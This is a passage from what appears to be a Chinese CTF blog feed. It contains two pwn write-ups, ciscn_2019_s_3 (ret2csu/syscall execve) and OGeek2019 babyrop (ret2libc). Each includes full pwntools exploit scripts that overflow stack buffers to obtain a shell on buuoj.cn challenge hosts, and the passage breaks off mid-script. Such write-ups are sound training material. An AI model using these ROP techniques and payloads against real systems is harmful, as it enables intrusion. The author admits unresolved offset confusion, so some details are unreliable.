class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigaction 13</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigprocmask 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioctl 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pread64 17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pwrite64 18</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readv 19</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_writev 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_access 21</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pipe 22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_select 23</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_yield 24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mremap 25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msync 26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mincore 27</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_madvise 28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmget 29</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill 62</span></span><br></pre></td></tr></table></figure><p>emm，经过多方取证呢，发现打开shell不仅要给第一个参数传上<code>/bin/sh</code>字符串，第二第三个字符串都需要置零。64位呢前六个参数是依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>这六个寄存器的。那么我们传参过程就比较艰难，注入代码首先肯定不现实，现在题目基本都是NX保护的挺到位的。所以要去程序里面寻找<code>gadget</code>，由于<code>pop %rbx</code>这个<code>gadget</code>巨难找，在实际应用要懂得变通，比如先给一个寄存器我想要的值然后再<code>mov</code>给<code>rdx</code>，有一样的效果。</p><p>由此就衍生出来一个<code>return to __libc_csu_init</code>简称<code>ret2csu</code>的方法来，其实这个我个人认为没有必要单独拿出来讲，因为就是因为这个特殊的函数基本蕴含了很多时候我们需要的<code>gadget</code>才会被如此传唱的，会了基本的<code>rop</code>攻击就行，<code>ret2csu</code>的原理跟这个就一模一样。</p><p>一般的payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fill_data+fake_rbp+(mov rax,<span class="number">59</span>)+pop_rdi+bin_sh_addr+pop_rsi+<span class="number">0</span>+pop_rdx+<span class="number">0</span></span><br></pre></td></tr></table></figure><p>这是一般的payload，如果找不到对应的gadget，可以自己适当变通。</p><h2 id="buuctf-ciscn-s-3"><a href="#buuctf-ciscn-s-3" class="headerlink" title="buuctf:ciscn_s_3"></a><a href="https://buuoj.cn/challenges#ciscn_2019_s_3">buuctf:ciscn_s_3</a></h2><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>64位无壳的elf程序，扔进<code>IDA</code>竟发现<code>plt</code>表只有可怜的两项，并且实用性也不大的那种。在一般的<code>ret2libc</code>中我们一般通过一个输出函数<code>(puts,write,printf)</code>来泄露地址，然而这里没有可以利用的输出函数，如果你想模仿下面输出一个<code>plt</code>表项内容也可以，不拦你，只是你费尽心思用系统调用的<code>puts</code>或者<code>write</code>为何不直接用<code>execve</code>直接<code>getshell</code>呢？所以我们就确定我们采用<code>syscall</code>的方式去<code>getshell</code>。</p><h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>这一个可以说很明显的一个栈溢出漏洞了，<code>read</code> <code>0x400</code>字节的数据，且缓冲区特别小。</p><h3 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h3><p>由于程序并未直接提供<code>/bin/sh</code>字符串，因此我们要靠自己，然后最后填上一个<code>main</code>实现二次溢出，第一次写<code>/bin/sh</code>，第二次执行<code>execve(&quot;/bin/sh&quot;)</code>。</p><hr><p>这里提出一点我自己的看法，我认为这个题目有点问题，vlun函数很可能存在栈不平衡的情况，理由有两点</p><p>1.程序正常执行(无溢出)无法正常结束</p><p>2.给<code>24</code>字节大小的数据可以直接覆盖<code>rip</code>，因为我的理解是缓冲区大小<code>16</code>字节再加上一个<code>rbp 8</code>字节应该<code>24</code>个字节才刚刚覆盖到<code>rbp</code>的位置，而无法覆盖返回地址的。</p><hr><p>而且由于我们要调用栈上的数据，且栈是动态的，我们无法准确得知我们写的<code>/bin/sh</code>字符串的所在位置，因此我们第一次溢出可谓是身负重担，不仅要提供<code>/bin/sh</code>字符串还要泄露栈的地址。由于程序只有下面的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br></pre></td></tr></table></figure><p>因此我们必须通过这个函数泄露点什么。</p><p>想想当时程序调用的栈帧是什么样的，什么内容是跟栈的地址有关的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低地址↑</span><br><span class="line">buf in vlun</span><br><span class="line"></span><br><span class="line">rbp for main</span><br><span class="line">rip for main</span><br><span class="line">rbp for main&#x27;s father function</span><br><span class="line">rip for main&#x27;s father function</span><br><span class="line">高地址↓</span><br></pre></td></tr></table></figure><p>如此我们也可以清楚看到，首先main的rbp是肯定被我们覆盖了的(PS 虽然现在好像是没有的)，然后后面还有一个调用main函数的那个函数的rbp，那个可以确定栈的地址，能输出这个之后我们就可以开始算偏移了。</p><p>gdb调试算算rbp与它们之间的偏移，这里需要注意由于栈不平衡的原因，我们需要手动调一下rip让程序不要异常退出，然后我们调试到leave指令可以观察到此时的栈。</p><p><img src="https://i.loli.net/2021/05/25/9jhLFiKV2cxZ3EA.png" alt="syscall_2.png"></p><p>在地址0x7fffffffde20的地方存了__libc_start_main函数的rbp=0x7fffffffdf28，那么计算一下偏移就是264，当前的rsp是main函数的rsp是vlun函数的rbp，所以我们泄露出来的这个地址与vlun函数的rbp偏移了264字节，然后再有16字节的缓冲区，如果我们再缓冲区开始写入<code>/bin/sh</code>字符串的话那么偏移就有280字节的大小。</p><p>然而这些应该是第二次溢出考虑的问题，这里只是分析一下泄露地址的可行性。</p><p>第一次的payload比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(main)</span><br></pre></td></tr></table></figure><p>然后接受准备接收rbp，但是在改rip的过程中发现这里还是有0x20个字节才能到rbp的，但是我能直接略过rbp覆盖rip就有点离谱，就不知道main的rbp是存在哪了，也许是存在rip后面了。这个我也不太能讲的清楚，希望有师傅明白的话能为我解答一下，感激不尽。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span><span class="comment">#注意一下栈往低地址增长</span></span><br></pre></td></tr></table></figure><p>那么第一次溢出完美的构造了<code>/bin/sh</code>字符串并且获得了它的地址。</p><h3 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h3><p>第二次溢出要准备的东西就有点多了。</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>我们需要的gadget有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rdx</span><br></pre></td></tr></table></figure><p>经过努力的寻找我们找到了mov rax,59用于代替pop rax，syscall本来就有，pop rdi很好找，pop rsi也有，唯独就是pop rdx找不着，但是关于rbx的gadget可以看到有一个mov rdx,r13，在libc_csu_init函数有一堆的pop寄存器的操作，我们也可以很容易找到pop r13，那么pop r13和mov rdx,r13两个一结合不就是pop rdx嘛，对吧。</p><p>但是需要注意的是，mov rdx,r13后面跟的并不是ret，所以在执行mov rdx,13这个gadget时候，要把rip及时地劫持回来。它运行到后面之后会执行call ptr[r12+rbx*8]，并且，rbx,rbp,r12~r15都是我们可以随意改的。</p><p>rbx我们置零，r12我们放在我们payload上面的其中一个地方能让它接着执行就可以了。</p><p>那么我们先写payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;/bin/sh\0&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdx)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br></pre></td></tr></table></figure><p>就是原本传给r12的偏移我用的是+0x48的，结果给报错了，反正这个题挺神奇的，就是感觉少了八字节的数据在里面但是好像又没少，希望有师傅能为我解答一下这个困惑，但是我一般遇到这种情况就偏移多8少8都试试看，如果是32位那就上下偏移4看看。</p><p>最后给师傅们看看结果吧</p><p><img src="https://i.loli.net/2021/05/25/SBZextFr7cIw3J8.png" alt="syscall_3.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28330</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span></span><br><span class="line">mov_rax=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">syscall=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/ban/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">bin_sh=rbp-<span class="number">280</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\0/bin/sh\0&#x27;</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(bin_sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_rdxr13_call)+p64(mov_rax)+p64(pop_rdi)+p64(bin_sh)+p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;today&lt;/code&gt;新的知识又增长了，发现了&lt;code&gt;getshell&lt;/code&gt;的另一种方式：&lt;code&gt;syscall&lt;/code&gt;和&lt;code&gt;srop&lt;/code&gt;。故事还要源于…(此处省略万字输出)&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="re" scheme="http://example.com/categories/ctf/re/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2libc实战</title>
    <link href="http://example.com/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/"/>
    <id>http://example.com/2021/05/13/ret2libc%E5%AE%9E%E6%88%98/</id>
    <published>2021-05-13T02:00:00.000Z</published>
    <updated>2021-10-25T04:36:58.197Z</updated>
    
    <content type="html"><![CDATA[<p><code>ret2libc</code>是一个<code>pwner</code>必备的基础知识。</p><p><code>ret2libc</code>为<code> return to libc</code>的缩写，我们需要执行<code>libc</code>函数里面的<code>system(&quot;/bin/sh&quot;)</code></p><p>下面为32位程序并且带.so文件的题目:<a href="https://buuoj.cn/challenges#[OGeek2019]babyrop">buuctfOGeek2019]babyrop</a></p><span id="more"></span><h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><p>下载两个文件先丢进IDA里面</p><p>首先是pwn.elf</p><p><code>shift+F12</code>查看字符串，看到比较有用的就是那个<code>Correct\n</code>但是这个不是逆向题，不用从结果分析，所以这个也是没什么用的，只能等会分析没有看到这个的时候再去整这个。然后也没有看到<code>/bin/sh</code>字符串，那么我们就先放弃字符串入手了。</p><p>查看main的伪C代码，得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先给你虚晃一枪，自己获得一个我们不知道的数，如果大于0才执行<code>read(fd,&amp;buf,4u);</code>而我们都知道，<code>read()</code>函数第一个参数必须为0才能让我们输入内容，那么这一段代码直接抛弃，它注定啥也干不了。然后执行了一个函数，跟进去看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为前面传入的<code>buf</code>指针我们并不可以输入任何值，又是局部变量，所以它的值也是不确定的，然后下面比较要求<code>buf==s</code>字符串，而这个<code>s</code>是<code>main()</code>的<code>buf</code>，这个函数的<code>buf</code>是我们可以决定的。但是可惜它用的是<code>strncmp</code>指定长度比较字符串，而长度是从这个函数的buf里面算到的，那么我们就可以把字符串第一位置为<code>\x00</code>以躲过检测，然后返回了<code>buf[7]</code>，那么这里我们就知道应该输入<code>\x00</code>开始的字符串，至于后面还得看它这个返回值干了啥，返回<code>main()</code>函数发现返回值为下一个函数的参数，而下一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显我们要在这里溢出了，但是缓冲区大小有足足231，而第一个选项不足以让我们溢出，所以我们如果把参数设为<code>\xff</code>那么就能输入255长度的字符串足以让我们溢出。所以前面的一个<code>payload</code>就可以这么构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;\x00&#x27;*7+&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure><p>但是找到了溢出点还不够，我们还没获取<code>system()</code>函数的地址，在<code>plt</code>表上也没有这个函数，所以我们打开<code>.so</code>文件，找到<code>system()</code>函数和<code>/bin/sh</code>字符串。注意我们反汇编的是<code>libc</code>文件，所以<code>system()</code>函数不跟平时一样在<code>plt</code>表，而是直接写在了代码段上面。</p><p><img src="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png" alt="buuctf _OGeek2019_babyrop_1.png"></p><p><img src="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png" alt="buuctf _OGeek2019_babyrop_2.png"></p><p>为什么有这一步呢？因为我在学习的过程中，发现<code>libcsearcher</code>不好用了，在<code>python</code>里面只能用<code>ELF()</code>函数去加载<code>.so</code>文件，但是无法<code>search</code>到<code>/bin/sh</code>字符串所以就出现了这一步，然后我们需要执行两次这个<code>main()</code>函数，因为第一次溢出你只能泄露<code>libc</code>的地址。然后我来回答一下为什么不直接再次执行那个溢出的函数，因为我们要传参大于<code>0xe7+0x10</code>才可以溢出，而构造的<code>payload</code>链又比较麻烦，重新溢出最好挑那些没有参数或者参数对我们影响不大的去重新执行。第二次还好说，直接把<code>system()</code>地址和<code>/bin/sh</code>的<code>payload</code>传进去就ok。</p><h3 id="第一次溢出泄露libc的地址"><a href="#第一次溢出泄露libc的地址" class="headerlink" title="第一次溢出泄露libc的地址"></a>第一次溢出泄露libc的地址</h3><p>挑选能输出的函数<code>write()</code>，<code>puts()</code>都行，但是<code>write()</code>传参比较多，所以我就用<code>write()</code>，怕万一遇到没有<code>puts()</code>就不会了，所以多会点总是好的，比赛你当然怎么简单怎么来。<code>write()</code>要传的参数第一个传0，第二个传要泄露的<code>libc</code>函数的地址，第三个就是泄露的字节大小，32位程序四字节足矣，你泄露自己也行，我这里选了一个<code>read()</code>函数，道理都是一样的。那么第一次的<code>payload</code>就可以构造出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>然后就是先去算<code>libc</code>的基址，反推出<code>system()</code>的地址。</p><p><code>libc.sym[&#39;read&#39;]</code>会返回<code>read()</code>在<code>libc</code>里面的偏移，泄露出<code>read()</code>的真实地址就可以算出<code>libc</code>的真实基址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#拿到真实地址</span></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#拿到真实基址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base_addr: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>调试测试一下。</p><p><img src="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png" alt="buuctf _OGeek2019_babyrop_3.png"></p><p>32位程序<code>libc</code>函数都是<code>0xf7</code>开头的，<code>libc</code>加载的时候会内存也对齐，所以末三位一定是0，所以我们这就得到了<code>libc</code>的真实地址。下面两步就把<code>system()</code>和<code>/bin/sh</code>算出来就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br></pre></td></tr></table></figure><p>因为好像并不能直接拿到这个偏移，但是可以在<code>gdb</code>里面调试得到<code>system()</code>相对<code>/bin/sh</code>的偏移，也可以前面<code>IDA</code>查看直接获取偏移，前面的那些地址就是我们所说的偏移，可以直接用，但是这里我们选择难一点的路线，就怕哪次给你直接断了那条简单路线，它不可能断你难的路线留一个简单的路线吧。</p><h3 id="第二次溢出直接执行system-“-bin-sh”"><a href="#第二次溢出直接执行system-“-bin-sh”" class="headerlink" title="第二次溢出直接执行system(“/bin/sh”)"></a>第二次溢出直接执行system(“/bin/sh”)</h3><p>这个payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>但是一定注意前面的<code>payload1</code>也要再<code>send</code>一次，不然执行不到这里的，我就这里卡了很久。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,xxx)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span 